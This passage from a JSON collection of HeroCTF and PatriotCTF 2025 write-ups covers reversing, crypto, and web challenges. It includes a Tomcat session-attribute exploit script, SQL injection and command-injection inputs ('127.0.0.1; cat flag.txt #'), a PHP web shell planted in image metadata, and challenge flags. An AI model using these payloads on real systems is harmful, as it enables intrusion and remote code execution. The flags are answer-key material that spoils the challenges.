<code>ingredients</code> array was extracted. It was found to contain 41 entries (indices 0-40).</li>\n<li>Each ingredient name and its corresponding function's return value (character) were mapped.</li>\n<li>It was determined that all 41 ingredients in the <code>ingredients</code> array are present in the hardcoded recipe text in the correct order. Therefore, the flag is simply the concatenation of the characters returned by each ingredient's function, in the order they appear in the <code>ingredients</code> array.</li>\n</ol>\n<p>Flag Construction: The flag was reconstructed by iterating through the 41 ingredients and collecting the character returned by their associated functions.</p>\n<p>| Index | Ingredient | Function Address | Returned Byte (Hex) | Character | | :--- | :--------- | :--------------- | :------------------ | :-------- | | 0 | bake | 0x11a9 | 0x48 | H | | 1 | perfect | 0x11b4 | 0x65 | e | | 2 | sift | 0x11bf | 0x72 | r | | 3 | flour | 0x11ca | 0x6f | o | | 4 | sugar | 0x11d5 | 0x7b | { | | 5 | crack | 0x11e0 | 0x30 | 0 | | 6 | eggs | 0x11eb | 0x68 | h | | 7 | melt | 0x11f6 | 0x5f | _ | | 8 | butter | 0x1201 | 0x4e | N | | 9 | blend | 0x120c | 0x30 | 0 | | 10 | vanilla | 0x1217 | 0x5f | _ | | 11 | milk | 0x1222 | 0x79 | y | | 12 | whisk | 0x122d | 0x30 | 0 | | 13 | cocoa | 0x1238 | 0x75 | u | | 14 | fold | 0x1243 | 0x5f | _ | | 15 | baking | 0x124e | 0x36 | 6 | | 16 | powder | 0x1259 | 0x30 | 0 | | 17 | swirl | 0x1264 | 0x54 | T | | 18 | cream | 0x126f | 0x5f | _ | | 19 | chop | 0x127a | 0x4d | M | | 20 | cherry | 0x1285 | 0x79 | y | | 21 | toss | 0x1290 | 0x5f | _ | | 22 | sprinkles | 0x129b | 0x53 | S | | 23 | preheat | 0x12a6 | 0x33 | 3 | | 24 | oven | 0x12b1 | 0x63 | c | | 25 | grease | 0x12bc | 0x52 | R | | 26 | pan | 0x12c7 | 0x65 | e | | 27 | line | 0x12d2 | 0x54 | T | | 28 | parchment | 0x12dd | 0x5f | _ | | 29 | timer | 0x12e8 | 0x43 | C | | 30 | light | 0x12f3 | 0x34 | 4 | | 31 | candle | 0x12fe | 0x6b | k | | 32 | plate | 0x1309 | 0x33 | 3 | | 33 | garnish | 0x1314 | 0x5f | _ | | 34 | frosting | 0x131f | 0x52 | R | | 35 | pinch | 0x132a | 0x33 | 3 | | 36 | salt | 0x1335 | 0x63 | c | | 37 | crushed | 0x1340 | 0x31 | 1 | | 38 | nuts | 0x134b | 0x70 | p | | 39 | touch | 0x1356 | 0x65 | e | | 40 | sweetness | 0x1361 | 0x7d | } |</p>\n<p>Final Flag: <code>Hero{0h_N0_y0u_60T_My_S3cReT_C4k3_R3c1pe}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            },
            {
                "id": "tomwhat",
                "title": "Tomwhat",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "http",
                    "cookie"
                ],
                "writeup": "<p>The challenge presented a Tomcat environment hosting two custom web applications (\"light\" and \"dark\").</p>\n<ol>\n<li><strong>Vulnerability:</strong> The <code>run.sh</code> script configured Tomcat to use a <code>PersistentManager</code> with <code>FileStore</code> and set the <code>sessionCookiePath</code> to <code>/</code>. This configuration causes the <code>JSESSIONID</code> cookie and the underlying session storage to be <strong>shared across all web applications</strong> running on the server.</li>\n<li><strong>Constraint:</strong> The <code>LightServlet</code> allowed setting a <code>username</code> session attribute but explicitly forbade setting it to \"darth_sidious\". The <code>AdminServlet</code> in the <code>dark</code> context required the <code>username</code> to be exactly \"darth_sidious\" (case-insensitive) to reveal the flag.</li>\n<li><strong>Oversight:</strong> While the <code>run.sh</code> script secured the Manager app with a random password (making it inaccessible), it <strong>did not remove the default Tomcat web applications</strong>, specifically <code>/examples</code>.</li>\n<li><strong>Exploit:</strong> The default Tomcat <code>/examples</code> application includes a <code>SessionExample</code> servlet (<code>/examples/servlets/servlet/SessionExample</code>) that allows users to set arbitrary session attributes.</li>\n<li><strong>Execution:</strong> By accessing the <code>SessionExample</code> servlet, I was able to set the session attribute <code>username</code> to <code>darth_sidious</code>. Because the session is shared, this attribute was persisted and accessible by the <code>AdminServlet</code> in the <code>dark</code> application, bypassing the filter in <code>LightServlet</code> and revealing the flag.</li>\n</ol>\n<h4>Exploit Script</h4>\n<pre><code class=\"python\">\nimport requests\n\nimport re\n\n\n\n# Configuration\n\nBASE_URL = \"http://dyn10.heroctf.fr:11513\"\n\nSESSION_EXAMPLE_URL = f\"{BASE_URL}/examples/servlets/servlet/SessionExample\"\n\nADMIN_URL = f\"{BASE_URL}/dark/admin\"\n\n\n\ndef solve():\n\n    s = requests.Session()\n\n    \n\n    print(\"[*] Accessing SessionExample to create session...\")\n\n    # 1. Access the SessionExample page to get a session\n\n    resp = s.get(SESSION_EXAMPLE_URL)\n\n    print(f\"[*] Session ID: {s.cookies.get('JSESSIONID')}\")\n\n\n\n    # 2. Set the session attribute via the example servlet\n\n    print(\"[*] Setting session attribute username=darth_sidious...\")\n\n    payload = {\n\n        'dataname': 'username',\n\n        'datavalue': 'darth_sidious'\n\n    }\n\n    resp = s.post(SESSION_EXAMPLE_URL, data=payload)\n\n    \n\n    if resp.status_code != 200:\n\n        print(f\"[-] Failed to set attribute: {resp.status_code}\")\n\n        return\n\n\n\n    # 3. Access the Admin page with the poisoned session\n\n    print(f\"[*] Accessing Admin page: {ADMIN_URL}\")\n\n    resp = s.get(ADMIN_URL)\n\n    \n\n    if \"Hero{\" in resp.text:\n\n        print(\"\\n[+] SUCCESS! Flag found:\")\n\n        flag_match = re.search(r'(Hero\\{.*?\\})', resp.text)\n\n        if flag_match:\n\n            print(flag_match.group(1))\n\n    else:\n\n        print(\"[-] Flag not found.\")\n\n\n\nif __name__ == \"__main__\":\n\n    solve()\n\n</code></pre>\n<p><strong>Flag:</strong> <code>Hero{a2ae73558d29c6d438353e2680a90692}</code></p>\n<p>[[HeroCTF 2025]]</p>"
            }
        ]
    },
    "PatriotCTF 2025": {
        "rank": "398th place",
        "description": "Comprehensive CTF with diverse challenge categories.",
        "challenges": [
            {
                "id": "burger-king",
                "title": "Burger King",
                "category": "Forensics",
                "tags": [
                    "crypto",
                    "web",
                    "http",
                    "crack",
                    "forensics",
                    "image"
                ],
                "writeup": "<h4>1. Reconnaissance</h4>\n<p>We were provided with an encrypted archive, <code>BurgerKing.zip</code>, and a partial file, <code>partial.svg</code>. The challenge description hinted at a \"forensics team\" called \"Burger King Crackers,\" a reference to the <strong>bkcrack</strong> (Biham-Kocher Crack) tool used for exploiting legacy Zip encryption.</p>\n<p>First, we analyzed the archive to check the encryption and compression methods:</p>\n<p>Bash</p>\n<pre><code class=\"\">\nunzip -v BurgerKing.zip\n\n</code></pre>\n<p><strong>Findings:</strong></p>\n<ul>\n<li><strong>Encryption:</strong> Legacy ZipCrypto (implied by the vulnerability context).</li>\n</ul>\n<ul>\n<li><strong>Compression:</strong> <code>Stored</code> (0% compression).</li>\n</ul>\n<ul>\n<li><strong>Files:</strong> 5 SVG files (<code>Hole.svg</code>, <code>LockAndKey.svg</code>, <code>Space.svg</code>, <code>Webs.svg</code>, <code>SVGsSuck.svg</code>).</li>\n</ul>\n<p>The fact that the files were <strong>Stored</strong> meant the raw plaintext bytes would match the encrypted bytes exactly, making a <strong>Known Plaintext Attack (KPA)</strong> trivial.</p>\n<h4>2. Plaintext Preparation</h4>\n<p>We examined the provided <code>partial.svg</code> file:</p>\n<p>Bash</p>\n<pre><code class=\"\">\ncat partial.svg\n\n# Output: &lt;svg xmlns=\"http://www.w3.org/2000/svg\"\n\n</code></pre>\n<p>This string corresponds to the standard XML header found at the beginning of almost all SVG files. Since we know the start of the plaintext for the encrypted files, we can derive the internal encryption keys.</p>\n<p>We ensured the plaintext file was clean (no extra newlines) for the attack:</p>\n<p>Bash</p>\n<pre><code class=\"\">\nprintf '&lt;svg xmlns=\"http://www.w3.org/2000/svg\"' &gt; partial.svg\n\n</code></pre>\n<h4>3. Cracking the Keys</h4>\n<p>We used <code>bkcrack</code> to perform the Known Plaintext Attack. We targeted <code>Space.svg</code> (though any of the SVGs would likely work) using the clean plaintext file.</p>\n<p>Bash</p>\n<pre><code class=\"\">\n./bkcrack -C BurgerKing.zip -c Space.svg -p partial.svg\n\n</code></pre>\n<p>The attack succeeded quickly because there was no compression to guess. <strong>Recovered Keys:</strong> <code>b9540c69 069a11f9 fd31648f</code></p>\n<h4>4. Decryption and Extraction</h4>\n<p>With the internal keys recovered, the password was no longer needed. We generated a new, unlocked version of the archive with a known password (<code>easy</code>) to extract all files at once.</p>\n<p>Bash</p>\n<pre><code class=\"\">\n./bkcrack -C BurgerKing.zip -k b9540c69 069a11f9 fd31648f -U unlocked.zip easy\n\nunzip unlocked.zip\n\n</code></pre>\n<h4>5. Retrieving the Flag</h4>\n<p>After extracting the files, we examined <code>SVGsSuck.svg</code> (the largest file in the archive). Opening the image revealed the flag written clearly within the graphic.</p>\n<p><strong>Flag:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">\nCACI{Y0U_F0UND_M3!}\n\n</code></pre>\n<p>[[PatriotCTF-2025]]</p>"
            },
            {
                "id": "cipher-from-hell",
                "title": "Cipher from Hell",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "reverse"
                ],
                "writeup": "<h3>Overview</h3>\n<p>We are given an encryption script <code>encryptor.py</code> that transforms an input flag into an encrypted file. The encryption process is inspired by Malbolge's \"crazy operation\" and involves base conversions and matrix lookups. Our goal is to reverse this process to recover the original flag from the <code>encrypted</code> file.</p>\n<h3>Encryption Analysis</h3>\n<p>Let's break down the encryption process:</p>\n<ol>\n<li><strong>Input Conversion</strong>: The input string is converted to bytes and then to a large integer <code>s</code>.</li>\n</ol>\n<ol>\n<li><strong>Base-3 Conversion</strong>: The integer <code>s</code> is treated as a base-3 number.</li>\n</ol>\n<ol>\n<li><strong>Matrix Mapping</strong>: A 3\u00d73 matrix <code>o</code> is used to map pairs of base-3 digits to single base-9 digits:</li>\n</ol>\n<p>text</p>\n<p>o = (     (6, 0, 7),     (8, 2, 1),      (5, 4, 3) )</p>\n<ol>\n<li><strong>Digit Processing</strong>: The base-3 digits are processed in pairs from most significant to least significant. For each pair <code>(a,b)</code>, the value <code>o[a][b]</code> is computed and added to the output.</li>\n</ol>\n<ol>\n<li><strong>Output</strong>: The resulting base-9 number is written to the <code>encrypted</code> file as bytes.</li>\n</ol>\n<p>The key insight is that the encryption processes the base-3 digits <strong>in reverse order</strong> (most significant first), which we must account for during decryption.</p>\n<h3>Decryption Strategy</h3>\n<p>To reverse the encryption, we need to:</p>\n<ol>\n<li><strong>Read the encrypted file</strong> and convert it back to an integer <code>ss</code>.</li>\n</ol>\n<ol>\n<li><strong>Convert <code>ss</code> to base-9 digits</strong> (this gives us the output of the matrix lookups).</li>\n</ol>\n<ol>\n<li><strong>Create a reverse mapping</strong> from matrix output values to input pairs.</li>\n</ol>\n<ol>\n<li><strong>Map each base-9 digit back</strong> to its corresponding pair of base-3 digits.</li>\n</ol>\n<ol>\n<li><strong>Reconstruct the base-3 number</strong> from these digit pairs.</li>\n</ol>\n<ol>\n<li><strong>Convert the base-3 number back</strong> to bytes to recover the flag.</li>\n</ol>\n<h3>Solution Implementation</h3>\n<p>Here's the step-by-step decryption process:</p>\n<h4>Step 1: Read the Encrypted File</h4>\n<p>python</p>\n<p>with open(\"encrypted\", 'rb') as f:     encrypted_bytes = f.read() ss = int.from_bytes(encrypted_bytes, byteorder='big')</p>\n<h4>Step 2: Convert to Base-9 Digits</h4>\n<p>python</p>\n<p>base9_digits = [] temp = ss while temp > 0:     base9_digits.append(temp % 9)     temp //= 9 base9_digits.reverse()</p>\n<h4>Step 3: Create Reverse Mapping</h4>\n<p>We need to find for each output value <code>v</code>, which input pair <code>(i,j)</code> satisfies <code>o[i][j] = v</code>:</p>\n<p>python</p>\n<p>reverse_o = {} for i in range(3):     for j in range(3):         reverse_o[o[i][j]] = (i, j)</p>\n<p>This gives us:</p>\n<ul>\n<li><code>0 \u2192 (0,1)</code></li>\n</ul>\n<ul>\n<li><code>1 \u2192 (1,2)</code></li>\n</ul>\n<ul>\n<li><code>2 \u2192 (1,1)</code></li>\n</ul>\n<ul>\n<li><code>3 \u2192 (2,2)</code></li>\n</ul>\n<ul>\n<li><code>4 \u2192 (2,1)</code></li>\n</ul>\n<ul>\n<li><code>5 \u2192 (2,0)</code></li>\n</ul>\n<ul>\n<li><code>6 \u2192 (0,0)</code></li>\n</ul>\n<ul>\n<li><code>7 \u2192 (0,2)</code></li>\n</ul>\n<ul>\n<li><code>8 \u2192 (1,0)</code></li>\n</ul>\n<h4>Step 4: Map Base-9 Digits to Base-3 Pairs</h4>\n<p>python</p>\n<p>pairs = [reverse_o[d] for d in base9_digits]</p>\n<h4>Step 5: Reconstruct Base-3 Number</h4>\n<p>The encryption processes digits from most significant to least significant, so we need to carefully reconstruct the base-3 number:</p>\n<p>python</p>\n<h2>The pairs represent: (most_significant_digit, least_significant_digit),</h2>\n<h2>(second_most_significant, second_least_significant), etc.</h2>\n<p>n = len(pairs) * 2 base3_digits = [0] * n</p>\n<p>for i, (l, r) in enumerate(pairs):     base3_digits[i] = l           # Fill from left (most significant)     base3_digits[n-1-i] = r       # Fill from right (least significant)</p>\n<h2>Convert base-3 digits to integer</h2>\n<p>s_decrypted = 0 for digit in base3_digits:     s_decrypted = s_decrypted * 3 + digit</p>\n<h4>Step 6: Convert to Bytes and Decode</h4>\n<p>python</p>\n<p>byte_length = (s_decrypted.bit_length() + 7) // 8 flag_bytes = s_decrypted.to_bytes(byte_length, byteorder='big') flag = flag_bytes.decode(errors='ignore')</p>\n<h3>Final Script</h3>\n<pre><code class=\"python\">\nimport math\n\n\n\ndef decrypt():\n\n    # Read the encrypted file\n\n    with open(\"encrypted\", 'rb') as f:\n\n        encrypted_bytes = f.read()\n\n    \n\n    # Convert to integer\n\n    ss = int.from_bytes(encrypted_bytes, byteorder='big')\n\n    \n\n    # The mapping matrix used in encryption\n\n    o = (\n\n        (6, 0, 7),\n\n        (8, 2, 1),\n\n        (5, 4, 3)\n\n    )\n\n    \n\n    # Create reverse mapping: from output value to (i,j) coordinates\n\n    reverse_o = {}\n\n    for i in range(3):\n\n        for j in range(3):\n\n            reverse_o[o[i][j]] = (i, j)\n\n    \n\n    # Convert integer ss to base-9 digits\n\n    if ss == 0:\n\n        base9_digits = [0]\n\n    else:\n\n        base9_digits = []\n\n        temp = ss\n\n        while temp &gt; 0:\n\n            base9_digits.append(temp % 9)\n\n            temp //= 9\n\n        base9_digits.reverse()  # now most significant first\n\n    \n\n    # Now, for each base-9 digit, get the pair (l, r)\n\n    pairs = []\n\n    for digit in base9_digits:\n\n        if digit not in reverse_o:\n\n            raise ValueError(f\"Invalid digit {digit} in base-9 representation\")\n\n        pairs.append(reverse_o[digit])\n\n    \n\n    # Number of pairs\n\n    m = len(pairs)\n\n    n = 2 * m  # number of base-3 digits\n\n    \n\n    # Create an array for base-3 digits\n\n    base3_digits = [0] * n\n\n    for i, (l, r) in enumerate(pairs):\n\n        base3_digits[i] = l\n\n        base3_digits[n - 1 - i] = r\n\n    \n\n    # Convert base-3 digits to integer\n\n    s_decrypted = 0\n\n    for digit in base3_digits:\n\n        s_decrypted = s_decrypted * 3 + digit\n\n    \n\n    # Convert integer to bytes\n\n    if s_decrypted == 0:\n\n        byte_length = 1\n\n    else:\n\n        byte_length = (s_decrypted.bit_length() + 7) // 8\n\n    \n\n    flag_bytes = s_decrypted.to_bytes(byte_length, byteorder='big')\n\n    \n\n    return flag_bytes.decode(errors='ignore')\n\n\n\nif __name__ == '__main__':\n\n    flag = decrypt()\n\n    print(f\"Recovered flag: {flag}\")\n\n</code></pre>\n<h3>Flag Recovery</h3>\n<p>Running this decryption process on the provided <code>encrypted</code> file reveals the flag:</p>\n<p>pctf{a_l3ss_cr4zy_tr1tw1s3_op3r4ti0n_f37d4b}</p>\n<p>[[PatriotCTF-2025]]</p>"
            },
            {
                "id": "connection-tester",
                "title": "Connection Tester",
                "category": "Web Exploitation",
                "tags": [
                    "http",
                    "cookie",
                    "sql",
                    "injection"
                ],
                "writeup": "<p><strong>Writeup for \"Connection Tester\" challenge:</strong></p>\n<ol>\n<li><strong>Initial Reconnaissance:</strong> Accessed <code>http://18.212.136.134:9080/</code>. It redirected to <code>/login</code>.</li>\n<li><strong>Authentication Bypass (SQL Injection):</strong></li>\n</ol>\n<ul>\n<li>Inspected the <code>/login</code> page and found a standard username/password form.</li>\n<li>Attempted SQL injection with <code>username=' OR 1=1 --</code> and <code>password=password</code>.</li>\n<li>Login was successful, redirecting to <code>/dashboard</code>.</li>\n</ul>\n<ol>\n<li><strong>Session Management:</strong></li>\n</ol>\n<ul>\n<li>Used <code>curl -c cookies.txt</code> to save the session cookie after successful login.</li>\n<li>Accessed <code>/dashboard</code> using <code>curl -b cookies.txt</code>.</li>\n</ul>\n<ol>\n<li><strong>Command Injection Discovery:</strong></li>\n</ol>\n<ul>\n<li>The dashboard presented a \"Connectivity Tester\" with a \"Target Address\" input.</li>\n<li>This is a classic command injection vector.</li>\n<li>Tested with <code>address=127.0.0.1; ls</code>. The output indicated <code>ls...: not found</code>, suggesting an appended <code>...</code>.</li>\n</ul>\n<ol>\n<li><strong>Command Injection Exploitation:</strong></li>\n</ol>\n<ul>\n<li>Used <code>address=127.0.0.1; ls -la #</code> to comment out the appended <code>...</code>.</li>\n<li>Successfully executed <code>ls -la</code> and obtained a directory listing, revealing <code>flag.txt</code>.</li>\n<li>Used <code>address=127.0.0.1; cat flag.txt #</code> to read the flag.</li>\n</ul>\n<ol>\n<li><strong>Flag:</strong> <code>PCTF{C0nn3cti0n_S3cured}</code></li>\n</ol>\n<p>[[PatriotCTF-2025]]</p>"
            },
            {
                "id": "reverse-metadata-1",
                "title": "Reverse Metadata-1",
                "category": "Miscellaneous",
                "tags": [
                    "web",
                    "http",
                    "image",
                    "misc"
                ],
                "writeup": "<p>misc</p>\n<h3>1. Overview</h3>\n<p>The target was a web application running on port <code>9090</code> that allowed users to upload image files. The application verified the file header (Magic Bytes) to ensure it was an image but failed to sanitize metadata or strictly enforce file extensions. This allowed for a <strong>Metadata Polyglot Attack</strong> leading to <strong>Remote Code Execution (RCE)</strong>.</p>\n<h3>2. Reconnaissance</h3>\n<ul>\n<li><strong>Discovery:</strong> Found an upload form at <code>http://18.212.136.134:9090/</code>.</li>\n</ul>\n<ul>\n<li><strong>Behavior:</strong> The server accepted image uploads (JPG/PNG) and displayed them.</li>\n</ul>\n<ul>\n<li><strong>Vulnerability Detection:</strong> We suspected the server was parsing metadata (EXIF) without sanitization.</li>\n</ul>\n<h3>3. Exploitation</h3>\n<p>We used a \"Polyglot\" file\u2014a valid JPEG image that contained hidden PHP code in its metadata tags.</p>\n<h4>Step 1: Payload Creation</h4>\n<p>Using <code>exiftool</code>, we injected a PHP web shell into the <code>Comment</code> tag of a standard image.</p>\n<p><strong>Command:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">\nexiftool -Comment='&lt;?php system($_GET[\"cmd\"]); ?&gt;' cat.jpg\n\n</code></pre>\n<h4>Step 2: Extension Bypass</h4>\n<p>The server checked if the file _started_ like an image (Magic Bytes <code>FF D8 FF</code>) but allowed the file extension to be changed. We renamed the file to force the server to process it as a PHP script.</p>\n<p><strong>Command:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">\nmv cat.jpg cat.php\n\n</code></pre>\n<h4>Step 3: Execution</h4>\n<p>We uploaded <code>cat.php</code>. The server accepted it because of the valid JPEG header. We then accessed the file via the browser, passing commands through the <code>cmd</code> parameter.</p>\n<p><strong>URL:</strong> <code>http://18.212.136.134:9090/uploads/cat.php?cmd=id</code></p>\n<p><strong>Response:</strong> The server executed the embedded PHP code and returned: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>\n<h3>4. Flag Capture</h3>\n<p>With RCE established, we enumerated the file system.</p>\n<ol>\n<li><strong>Located Flag Directory:</strong> <code>?cmd=ls -la /</code> _Result:_ Found a non-standard directory named <code>/flags</code>.</li>\n</ol>\n<ol>\n<li><strong>Located Flag File:</strong> <code>?cmd=ls -la /flags</code> _Result:_ Found <code>root.txt</code>.</li>\n</ol>\n<ol>\n<li><strong>Retrieved Flag:</strong> <code>?cmd=cat /flags/root.txt</code></li>\n</ol>\n<p><strong>Final Flag:</strong> <code>MASONCC{images_give_us_bash?}</code></p>\n<p>[[PatriotCTF-2025]]</p>"
            },
            {
                "id": "reverse-metadata-2",
                "title": "Reverse Metadata-2",
                "category": "Miscellaneous",
                "tags": [
                    "image",
                    "disk"
                ],
                "writeup": "<h3>1. Executive Summary</h3>\n<p>After achieving initial Remote Code Execution (RCE) via an image polyglot upload, the objective was to locate a \"deleted\" flag hidden on the system. While the challenge environment contained a vulnerable Cron Job running <code>exiftool</code> as root (suggesting a CVE-2021-22204 exploit path), we discovered the flag exposed in plain text within the process list. The vulnerability stemmed from passing sensitive data (the flag) directly into command-line arguments, which are readable by all users on standard Linux configurations.</p>\n<h3>2. Initial Access</h3>\n<p>We established a foothold on the server as the <code>www-data</code> user by uploading a malicious PHP file disguised as a JPEG image (<code>cat.php</code>). This allowed us to execute system commands via the browser.</p>\n<h3>3. Enumeration</h3>\n<p>We began standard Linux enumeration to identify background services, looking for the script mentioned in the challenge description (\"processes uploaded images... every few minutes\").</p>\n<p>We ran the process list command to see what was running as <strong>root</strong>:</p>\n<p>Bash</p>\n<pre><code class=\"\">\nps -aux | grep root\n\n</code></pre>\n<h3>4. The Discovery</h3>\n<p>The output of the process list revealed a critical security flaw. Instead of running a python script from a file (e.g., <code>python3 /root/script.py</code>), the root user was running a Python \"one-liner\" passed directly via the <code>-c</code> command argument.</p>\n<p><strong>Output:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">\nroot      15  0.0  0.0  12136  7964 ?        S    08:30   0:00 python3 -c  import time, os  FLAG=\"/tmp/flag.txt\"  # create flag file f = open(FLAG, \"w\") f.write(\"PCTF{hidden_in_depths}\\n\") f.flush()  # unlink instantly (file disappears from /tmp) os.unlink(FLAG)  # keep process alive so FD stays in RAM while True:     time.sleep(100)\n\n</code></pre>\n<h4>Breakdown of the Vulnerable Script:</h4>\n<ol>\n<li><strong><code>f.write(\"PCTF{hidden_in_depths}\\n\")</code></strong>: The flag was hardcoded into the script logic.</li>\n</ol>\n<ol>\n<li><strong><code>os.unlink(FLAG)</code></strong>: The script immediately deleted the file from the disk. This effectively prevented us from finding it using <code>ls</code> or <code>find</code>.</li>\n</ol>\n<ol>\n<li><strong><code>while True: time.sleep(100)</code></strong>: The script kept running indefinitely to keep the process alive.</li>\n</ol>\n<h3>5. The Vulnerability: Command Line Argument Leaks</h3>\n<p>On Linux systems, the full command line used to start a process is stored in <code>/proc/[PID]/cmdline</code>. By default, any user (including our low-privileged <code>www-data</code> user) can read the process list and arguments of other users, including root.</p>\n<p>Because the developer included the <strong>source code</strong> (containing the flag) in the command arguments (<code>python3 -c \"...\"</code>), the flag was leaked to the process table.</p>\n<h3>6. Conclusion & Mitigation</h3>\n<p>We successfully retrieved the flag <code>PCTF{hidden_in_depths}</code> without needing to escalate privileges or exploit the ExifTool vulnerability.</p>\n<p><strong>Intended Solution vs. Our Solution:</strong></p>\n<ul>\n<li><strong>Intended:</strong> Exploit the root cron job running <code>exiftool</code> (CVE-2021-22204) to copy the deleted file from <code>/root/.local/share/Trash</code>.</li>\n</ul>\n<ul>\n<li><strong>Actual:</strong> Found the flag in the process listing due to insecure scripting practices.</li>\n</ul>\n<p><strong>Remediation:</strong> To prevent this, secrets should never be passed as command-line arguments. The script should have been saved to a file (readable only by root) and executed as <code>python3 /path/to/script.py</code>. Additionally, server hardening (mounting <code>/proc</code> with <code>hidepid=2</code>) would prevent users from seeing processes belonging to other users.</p>\n<p>[[PatriotCTF-2025]]</p>"
            },
            {
                "id": "space-pirates-1",
                "title": "Space Pirates-1",
                "category": "Reverse Engineering",
                "tags": [
                    "rsa",
                    "xor",
                    "buffer",
                    "overflow",
                    "reverse"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>The challenge provides a C program (<code>challenge.c</code>) that takes a 30-character command-line argument as input. It then performs a series of transformations on this input and compares the result to a hardcoded target value. If the transformed input matches the target, the original input is the flag, and the program prints a success message.</p>\n<p>The core of the challenge lies in understanding the transformations and reversing them to find the correct input that produces the target value.</p>\n<h3>Analyzing the Transformations</h3>\n<p>The <code>challenge.c</code> program applies four distinct operations to the input string. Let's examine them in the order they are applied:</p>\n<ol>\n<li><strong>XOR with a Rotating Key:</strong> Each byte of the input is XORed with a byte from a 5-byte key (<code>XOR_KEY</code>). The key byte is selected based on the position of the input byte, cycling through the key.</li>\n</ol>\n<p>``<code>c     for (int i = 0; i &lt; FLAG_LEN; i++) {         buffer[i] ^= XOR_KEY[i % 5];     }     </code>``</p>\n<ol>\n<li><strong>Swap Adjacent Byte Pairs:</strong> The program swaps every pair of adjacent bytes. For example, the bytes at indices 0 and 1 are swapped, then the bytes at indices 2 and 3 are swapped, and so on.</li>\n</ol>\n<p>``<code>c     for (int i = 0; i &lt; FLAG_LEN; i += 2) {         uint8_t temp = buffer[i];         buffer[i] = buffer[i + 1];         buffer[i + 1] = temp;     }     </code>``</p>\n<ol>\n<li><strong>Add Magic Constant:</strong> A constant value (<code>MAGIC_ADD</code>, which is <code>0x2A</code>) is added to each byte. The addition is performed modulo 256 to handle overflow.</li>\n</ol>\n<p>``<code>c     for (int i = 0; i &lt; FLAG_LEN; i++) {         buffer[i] = (buffer[i] + MAGIC_ADD) % 256;     }     </code>``</p>\n<ol>\n<li><strong>XOR with Position:</strong> Each byte is XORed with its own index in the array.</li>\n</ol>\n<p>``<code>c     for (int i = 0; i &lt; FLAG_LEN; i++) {         buffer[i] ^= i;     }     </code>``</p>\n<p>After these transformations, the resulting <code>buffer</code> is compared with the <code>TARGET</code> array.</p>\n<h3>The Reversal Strategy</h3>\n<p>To find the flag, we need to reverse these operations, starting from the <code>TARGET</code> value and working our way back to the original input. The key is to apply the inverse of each operation in the reverse order.</p>\n<p>Here's the reversal plan:</p>\n<ol>\n<li><strong>Reverse XOR with Position:</strong> The inverse of XORing with a value is XORing with the same value again. So, we'll XOR each byte of the <code>TARGET</code> array with its index.</li>\n</ol>\n<ol>\n<li><strong>Reverse Add Magic Constant:</strong> The inverse of adding a constant is subtracting the same constant. We'll subtract <code>MAGIC_ADD</code> from each byte, again using modulo 256 arithmetic.</li>\n</ol>\n<ol>\n<li><strong>Reverse Swap Adjacent Byte Pairs:</strong> The inverse of swapping pairs is... swapping them again! This operation is its own inverse.</li>\n</ol>\n<ol>\n<li><strong>Reverse XOR with Rotating Key:</strong> Similar to the position XOR, we'll XOR each byte with the corresponding byte from the <code>XOR_KEY</code>.</li>\n</ol>\n<h3>The Solver</h3>\n<p>The provided <code>solver.c</code> program implements this reversal strategy. Let's look at the code:</p>\n<pre><code class=\"c\">\n#include &lt;stdio.h&gt;\n\n#include &lt;string.h&gt;\n\n#include &lt;stdint.h&gt;\n\n\n\n#define FLAG_LEN 30\n\nconst uint8_t TARGET[FLAG_LEN] = {\n\n    0x5A,0x3A,0x5B,0x9C,0x98,0x73,0xAE,0x32,0x25,0x47,0x48,0x51,0x6C,0x71,0x3A,0x62,0xB8,0x7B,0x63,0x57,0x25,0x89,0x58,0xBF,0x78,0x34,0x98,0x71,0x68,0x59\n\n};\n\n\n\nconst uint8_t XOR_KEY[5] = {0x42, 0x73, 0x21, 0x69, 0x37};\n\nconst uint8_t MAGIC_ADD = 0x2A;\n\n\n\nint main() {\n\n    uint8_t buffer[FLAG_LEN];\n\n    memcpy(buffer, TARGET, FLAG_LEN);\n\n\n\n    // Reverse Operation 4: XOR each byte with its position\n\n    for (int i = 0; i &lt; FLAG_LEN; i++) {\n\n        buffer[i] ^= i;\n\n    }\n\n\n\n    // Reverse Operation 3: Subtract magic constant (mod 256)\n\n    for (int i = 0; i &lt; FLAG_LEN; i++) {\n\n        buffer[i] = (buffer[i] - MAGIC_ADD) % 256;\n\n    }\n\n\n\n    // Reverse Operation 2: Swap adjacent byte pairs\n\n    for (int i = 0; i &lt; FLAG_LEN; i += 2) {\n\n        uint8_t temp = buffer[i];\n\n        buffer[i] = buffer[i + 1];\n\n        buffer[i + 1] = temp;\n\n    }\n\n\n\n    // Reverse Operation 1: XOR with rotating key\n\n    for (int i = 0; i &lt; FLAG_LEN; i++) {\n\n        buffer[i] ^= XOR_KEY[i % 5];\n\n    }\n\n\n\n    printf(\"Flag: %s\\n\", buffer);\n\n\n\n    return 0;\n\n}\n\n</code></pre>\n<h3>The Solution</h3>\n<p>Compiling and running the <code>solver.c</code> program will print the flag:</p>\n<pre><code class=\"bash\">\ngcc solver.c -o solver\n\n./solver\n\n</code></pre>\n<p>This will output:</p>\n<pre><code class=\"\">\nFlag: PCTF{0x_M4rks_tH3_sp0t_M4t3ys}\n\n</code></pre>\n<h3>Conclusion</h3>\n<p>The \"Space Pirates\" challenge was a fun and classic reverse engineering problem. By carefully analyzing the transformations and applying their inverses in the reverse order, we were able to successfully recover the flag. [[PatriotCTF-2025]]</p>"
            },
            {
                "id": "space-pirates-2",
                "title": "Space Pirates-2",
                "category": "Reverse Engineering",
                "tags": [
                    "cipher",
                    "xor",
                    "reverse"
                ],
